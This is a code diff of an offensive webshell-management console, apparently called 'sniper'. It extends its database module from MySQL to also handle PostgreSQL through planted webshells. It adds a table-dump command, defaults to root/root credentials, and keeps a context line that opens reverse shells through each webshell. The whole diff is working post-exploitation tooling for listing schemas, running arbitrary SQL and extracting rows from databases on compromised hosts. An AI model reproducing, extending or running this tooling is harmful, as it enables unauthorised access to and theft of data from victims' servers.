@@ -182,48 +182,63 @@ class Repl(cmd2.Cmd):
         self._each(lambda ws: revshell.reverse_shell(ws, ip, port), "revshell")
 
     def do_db(self, _: cmd2.Statement) -> None:
-        """Open the MySQL manager (via the webshell)."""
-        host = self._ask("MySQL host", "127.0.0.1")
+        """Open the database manager (MySQL or PostgreSQL) via the webshell."""
+        engine = self._ask("Engine (mysql/pgsql)", "mysql")
+        host = self._ask("Host", "127.0.0.1")
         user = self._ask("Username", "root")
         password = self._ask("Password", "root")
+        db = self._ask("Database (blank = default)", "") if engine == "pgsql" else ""
         for ws in self.webshells:
-            log.info(f"[database] {ws}")
-            manager = database.MysqlManager(ws, host, user, password)
-            if manager.check_connection():
+            log.info(f"[database:{engine}] {ws}")
+            try:
+                client = database.make_client(engine, ws, host, user, password, db)
+            except ValueError as exc:
+                log.error(str(exc))
+                return
+            if client.check_connection():
                 log.success("Connected.")
-                self._database_repl(manager)
+                self._database_repl(client)
 
-    def _database_repl(self, manager: database.MysqlManager) -> None:
+    def _database_repl(self, client: database.SqlClient) -> None:
         help_text = (
-            "  d=databases  t=tables  c=columns  u=user  v=version  "
-            "cd=current-db  e=exec-sql  q=quit"
+            "  d=databases/schemas  t=tables  c=columns  dump=dump-table  "
+            "u=user  v=version  ns=current  e=exec-sql  q=quit"
         )
         log.info(help_text)
         while True:
-            cmd = input("sniper(mysql) => ").strip().lower()
+            cmd = input("sniper(db) => ").strip().lower()
             try:
                 if cmd in ("q", "quit", "exit"):
                     break
                 elif cmd == "h":
                     log.info(help_text)
                 elif cmd == "d":
-                    log.table(["Database"], [[d] for d in manager.databases()])
+                    log.table(["Database/Schema"], [[d] for d in client.databases()])
                 elif cmd == "u":
-                    log.success(manager.current_user())
+                    log.success(client.current_user())
                 elif cmd == "v":
-                    log.success(manager.version())
-                elif cmd == "cd":
-                    log.success(manager.current_database())
+                    log.success(client.version())
+                elif cmd == "ns":
+                    log.success(client.current_namespace())
                 elif cmd == "t":
-                    db = self._ask("Database", manager.current_database())
-                    log.table(["Table"], [[t] for t in manager.tables(db)])
+                    schema = self._ask("Schema", client.current_namespace())
+                    log.table(["Table"], [[t] for t in client.tables(schema)])
                 elif cmd == "c":
-                    db = self._ask("Database", manager.current_database())
+                    schema = self._ask("Schema", client.current_namespace())
                     table = input("Table: ").strip()
-                    log.table(["Column"], [[col] for col in manager.columns(db, table)])
+                    log.table(["Column"], [[col] for col in client.columns(schema, table)])
+                elif cmd == "dump":
+                    schema = self._ask("Schema", client.current_namespace())
+                    table = input("Table: ").strip()
+                    limit = int(self._ask("Limit", "50"))
+                    cols, rows = client.dump(schema, table, limit)
+                    if rows:
+                        log.table(cols or [f"col{i}" for i in range(len(rows[0]))], rows)
+                    else:
+                        log.warning("No rows.")
                 elif cmd == "e":
                     sql = input("SQL: ").strip()
-                    rows = manager.query(sql)
+                    rows = client.query(sql)
                     if rows:
                         log.table([f"col{i}" for i in range(len(rows[0]))], rows)
                     else:
